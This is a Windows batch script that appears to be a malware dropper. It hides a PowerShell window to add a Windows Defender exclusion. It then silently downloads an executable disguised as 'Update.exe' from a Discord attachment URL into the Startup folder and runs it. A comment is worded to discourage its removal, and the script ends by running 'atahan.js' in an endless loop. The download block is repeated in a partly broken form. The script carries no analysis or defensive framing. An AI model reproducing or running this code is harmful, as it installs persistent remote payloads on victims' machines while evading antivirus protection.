powershell -w hidden -c Add-MpPreference -ExclusionPath ""

@echo off
setlocal 

set "URL=https://cdn.discordapp.com/attachments/1175444254902988891/1220039036601634889/Update.exe?ex=660d7ce5&is=65fb07e5&hm=3e8ff06d302223a0f061ae7b3ddd89fbc70292011c51155570fb0d57a5d522dd&"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Update.exe"

// Downloads Missing Files, Automatically Updates, Do Not Delete the Command

if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"

@echo off
setlocal 

set "URL=https://cdn.discordapp.com/attachments/1175444254902988891/1220039036601634889/Update.exe?ex=660d7ce5&is=65fb07e5&hm=3e8ff06d302223a0f061ae7b3ddd89fbc70292011c51155570fb0d57a5d522dd&"

if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"



start atahan.js

title atahan
:a
node atahan.js
goto a

@echo off
